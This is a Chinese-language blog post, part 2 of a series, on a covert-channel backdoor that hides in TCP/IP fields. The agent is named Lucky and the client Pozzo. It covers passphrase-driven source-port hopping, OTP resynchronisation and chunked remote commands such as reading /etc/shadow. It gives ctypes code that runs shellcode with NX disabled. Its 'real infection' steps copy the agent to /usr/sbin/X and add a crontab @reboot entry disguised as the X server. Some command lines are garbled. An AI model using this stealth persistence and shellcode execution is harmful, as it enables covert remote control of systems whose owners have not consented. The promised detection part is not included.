### 源端口字段初始化与哈希处理

源端口字段由2个字节（即4个十六进制数字）组成。根据给定的通行字短语（长度必须大于8字符，以确保生成高端口），我们首先初始化最高有效位的十六进制数字。接下来，使用SHA512算法对通行字短语进行哈希处理，并提取哈希值的前3个十六进制数字。这些数字将与初始数字组合，形成完整的4个十六进制数字或2个字节的源端口号。

为了生成下一个端口号，我们将重复上述哈希计算过程。这种方法能够生成一系列不可预测的端口号，对于不知道通行字短语的人来说，这些端口号是完全随机的。只有代理程序（Lucky）和客户端（Pozzo）知道下一个正确的通信端口。出现具有正确源端口的“噪音”数据包的概率仅为1/65536，因此可以忽略不计。

### 克服不一致的状态（或狗项圈）

尽管出现噪音数据包的可能性极低，但代理程序仍可能接收到具有正确源端口的非预期数据包。如果这种情况发生，代理程序会尝试解密并处理这些无效数据包，导致密钥循环和解密失败，从而破坏通信的一致性。客户端将继续使用代理无法识别的密钥进行加密，导致双方失去同步，最终可能导致远程控制能力的丧失。

为防止这种情况，我们引入了“狗项圈”机制。在一次性密码（OTP）方案中，我们保留了一个特殊的控制密钥和一个控制源端口。当代理程序从控制源端口接收到包含特殊RST有效载荷的数据包时，它将重置OTP密钥和源端口循环机制，从而恢复通信的一致性。

### 长有效载荷的处理

某些命令（如`find / -name "flag" 2> /dev/null`）的长度超过单个数据包的5字节限制（加上1字节的操作码）。在这种情况下，需要将命令分块并通过多个数据包传送。Lucky必须理解这些分块命令，并等待所有相关数据包到达后才能执行完整命令。

类似地，对于输出较大的命令（如`head -1 /etc/shadow`），其结果可能超过100字节，也需要通过多个数据包返回。Pozzo必须知道何时等待更多数据以及何时整个有效载荷已传输完成。此外，Lucky仅在响应数据包时发送数据包。

### 协议中的协议

通过使用操作码，我们可以实现有状态的传输。不同的操作码指示不同类型的传输状态，例如“还有更多数据要传送”、“这是命令的一部分”、“这是最后一个数据包，现在执行该命令”。这种机制类似于TCP分组算法，但不需要数据偏移量。OTP方案确保如果数据包丢失，后续数据包将无法解密，从而避免部分执行的问题。

### Lucky的应答方式

除非需要应答，否则Lucky不会发送数据包。当Lucky希望与Pozzo通信时，它会通知Pozzo。然后，Pozzo开始发送随机数据（带有“谈谈”操作码），并且只接受有意义的应答。Lucky还会声明何时结束对话，之后保持静默直到下一个命令。

### 执行Shellcode结束Lucky

传递shellcode后，在Linux中可以通过以下步骤执行：

```python
import ctypes
from ctypes import c_char_p, c_void_p, CDLL, memmove, CFUNCTYPE

libc = CDLL('libc.so.6')  # 加载 libc
sc = c_char_p(shellcode)  # 利用shellcode生成一个C字符串
size = len(shellcode)  # 计算shellcode的长度
addr = c_void_p(libc.valloc(size))  # 根据shellcode长度分配堆内存
memmove(addr, sc, size)  # 将shellcode从堆栈变量复制到堆内存
libc.mprotect(addr, size, 0x7)  # 禁用数据内存的NX保护
run = cast(addr, CFUNCTYPE(c_void_p))  # 将指向堆中shellcode的指针转换为函数指针
run()  # 运行shellcode
```

这段代码将shellcode复制到堆内存中，禁用NX保护，并跳转到相应地址执行。Lucky将在shellcode终止时停止执行。

### 变成独立进程

在Windows中，可以使用`CreateThread()`来创建一个新的线程来执行shellcode。这样做的好处是EIP在Windows中难以跟踪，即使开发者也无法追踪。

### 测试与实际感染

启动Lucky：
```bash
# Jlucfy.py mypassphrase
```
连接Pozzo：
```bash
# Jpozzapy takeCjp mypassphrase
```

实际感染：
```bash
cp lucky.py /usr/sbin/X
printf "@reboot /usr/sbin/X -rootless -noreset\n" > /etc/crontab
```

原始的X可执行文件位于`/usr/bin`目录。系统管理员可能不会注意到这个冒牌货，因为很少有人会仔细检查X的手册页。

### 开启视频模式

在Pozzo和Lucky之间运行一些Linux命令，并使用tcpdump嗅探网络流量。

### 结束语

目前，这个项目是封闭的，因为它是一项未完成的个人研究。整体思路类似于学术论文《Embedding Covert Channels into TCP/IP》(Murdoch & Lewis, 2005)。任何人都可以基于本文介绍的思路编写自己的实现版本。虽然我的技术不是最好的，但我相信还有很多改进的空间。在编写Pozzo和Lucky的过程中，我学到了很多东西，希望读者也能从中受益。

### 未来工作

- 使用ASM或C++编写工具，以减少依赖关系。
- 探索其他协议，如ARP，以提高隐蔽性。
- 提供更多的实现细节和示例。
- 开发用于隐写术过滤的PF-Sense插件。

### 第3篇预告

第3篇将讨论针对这种技术的检测方法和防御措施。虽然TCP序列字段的熵与`/dev/urandom`的熵具有相同数量的字节，但它们的概率分布不同。这可能是检测隐写数据的一个关键点。下一篇将详细介绍函数、积分以及防火墙和IDS日志等。

**传送门**
* * *
[【技术分享】基于TCP/IP协议栈的隐写术和隐蔽通道（part 1）](http://bobao.360.cn/learning/detail/3754.html)